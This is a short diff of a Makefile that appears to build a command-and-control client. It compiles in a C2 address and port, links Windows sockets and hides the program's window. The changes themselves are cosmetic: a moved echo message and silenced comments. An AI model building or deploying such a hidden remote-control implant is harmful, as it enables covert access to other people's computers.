@@ -51,12 +51,12 @@ endif
 all: $(SRC)
 ifeq ($(OS),Windows_NT) # Windows
 	$(eval $(call wininput))
-	@echo If you are using MSYS/MSYS2 etc. and it enters cmd, please type exit to quit
 	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
 ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC)
 	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
 else
 ifeq ($(findstring MSYS_NT,$(shell uname -s)),MSYS_NT) # MSYS/MSYS2
+	@echo 稍后会进入cmd终端里请输入exit来退出
 	$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
 endif
 ifeq ($(findstring Windows_NT,$(shell uname -s)),Windows_NT) # W32/64devkit
@@ -133,10 +133,10 @@ endif
 
 update:
 ifeq ($(OS),Windows_NT)
-	# 检测有没有git
+	@# 检测有没有git
 	@cmd $(P)/c "where git >nul 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
 else
-	# 检测有没有git
+	@# 检测有没有git
 	@sh -c "which git > /dev/null 2>&1 && (git pull && echo Update complete) || echo Git not detected, please update manually"
 endif
 
